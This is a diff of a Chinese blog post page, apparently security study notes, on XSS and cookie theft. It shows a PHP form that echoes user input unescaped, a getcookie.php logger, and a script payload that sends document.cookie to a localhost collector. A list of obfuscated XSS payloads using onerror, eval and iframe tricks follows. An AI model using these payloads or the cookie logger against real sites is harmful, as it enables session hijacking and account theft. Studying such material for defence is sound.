@@ -6,7 +6,14 @@
     <meta charset="utf-8">
     <meta name="keywords" content="XSS跨站脚本攻击剖析与防御, 书鱼">
     <meta name="description" content="cookie欺骗攻击index.php
-123456789101112131415&amp;lt;?phpsetcookie(&#34;name&#34;,&#34;cookie&#34;);if(isset($_POST[&#39;name&#39;]))&amp;#123;echo $_POST[&#39;">
+&amp;lt;?php
+setcookie(&#34;name&#34;,&#34;cookie&#34;);
+if(isset($_POST[&#39;name&#39;]))
+{
+echo $_POST[&#39;name&#39;];
+}
+?&gt;
+&amp;lt;html&gt;">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -384,7 +391,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    268
+                    237
                 </div>
                 
 
@@ -408,20 +415,42 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h4 id="cookie欺骗攻击"><a href="#cookie欺骗攻击" class="headerlink" title="cookie欺骗攻击"></a>cookie欺骗攻击</h4><p>index.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">setcookie(<span class="string">"name"</span>,<span class="string">"cookie"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $_POST[<span class="string">'name'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">Name: &lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span>&gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span><span class="token string">"cookie"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+<span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
+Name<span class="token punctuation">:</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre>
 <p>getcookie.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie1=$_GET[<span class="string">'cookie'</span>];</span><br><span class="line">$log=fopen(<span class="string">"demo.txt"</span>,<span class="string">"a"</span>);</span><br><span class="line">fwrite($log,$cookie1.<span class="string">"\n"</span>);</span><br><span class="line">fclose($log)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$cookie1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$log</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"demo.txt"</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">,</span><span class="token variable">$cookie1</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">)</span>
+<span class="token delimiter">?></span></code></pre>
 <p>payload,输入框输入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var img = document.createElement(&apos;img&apos;);img.src = &apos;http://localhost/getcookie.php?cookie=&apos;+encodeURIComponent(document.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;script&gt;var img = document.createElement(&#39;img&#39;);img.src = &#39;http://localhost/getcookie.php?cookie=&#39;+encodeURIComponent(document.cookie);&lt;/script&gt;</code></pre><p>成功在demo.txt中获得cookie</p>
+<h4 id="一些payload"><a href="#一些payload" class="headerlink" title="一些payload"></a>一些payload</h4><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>img src <span class="token operator">=</span> <span class="token string">"#"</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token operator">></span>
 
-<p>成功在demo.txt中获得cookie</p>
-<h4 id="一些payload"><a href="#一些payload" class="headerlink" title="一些payload"></a>一些payload</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src = <span class="string">"#"</span> onerror=alert(<span class="regexp">/xss/</span>)&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">"x"</span> onerror=<span class="string">"&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;"</span>&gt;</span><br><span class="line">&lt;img src=<span class="string">"1"</span> onerror=<span class="built_in">eval</span>(<span class="string">"\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29"</span>)&gt;<span class="xml"><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span></span><br><span class="line">原code:</span><br><span class="line">&lt;img src=<span class="string">"1"</span> onerror=<span class="built_in">eval</span>(<span class="string">"alert('xss')"</span>)&gt;<span class="xml"><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span></span><br><span class="line">&lt;a href=<span class="string">""</span> onclick=<span class="string">"alert(1)"</span>&gt;aaaaa&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">&lt;a href="" onclick=eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")&gt;aaaaa&lt;/</span>a&gt; </span><br><span class="line">&lt;iframe src=javascript:alert(<span class="string">'xss'</span>);height=<span class="number">0</span> width=<span class="number">0</span> /&gt;<span class="xml"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span> </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">&lt;iframe src=1 onmouseover=alert('xss') y=2016 /&gt;&lt;iframe&gt;</span><br></pre></td></tr></table></figure>
+<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"x"</span> onerror<span class="token operator">=</span><span class="token string">"&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;"</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"1"</span> onerror<span class="token operator">=</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>img<span class="token operator">></span>
+原code<span class="token punctuation">:</span>
+<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"1"</span> onerror<span class="token operator">=</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"alert('xss')"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>img<span class="token operator">></span>
+<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">""</span> onclick<span class="token operator">=</span><span class="token string">"alert(1)"</span><span class="token operator">></span>aaaaa<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>
+<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">""</span> onclick<span class="token operator">=</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29"</span><span class="token punctuation">)</span><span class="token operator">></span>aaaaa<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span> 
+<span class="token operator">&lt;</span>iframe src<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>height<span class="token operator">=</span><span class="token number">0</span> width<span class="token operator">=</span><span class="token number">0</span> <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>iframe<span class="token operator">></span> 
+<span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span>
+<span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token number">1</span> onmouseover<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span> y<span class="token operator">=</span><span class="token number">2016</span> <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>iframe<span class="token operator">></span> </code></pre>
+
             </div>
             <hr/>
 
@@ -811,7 +840,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">175.5k</span>&nbsp;字
+                class="white-color">173.5k</span>&nbsp;字
             
             
             
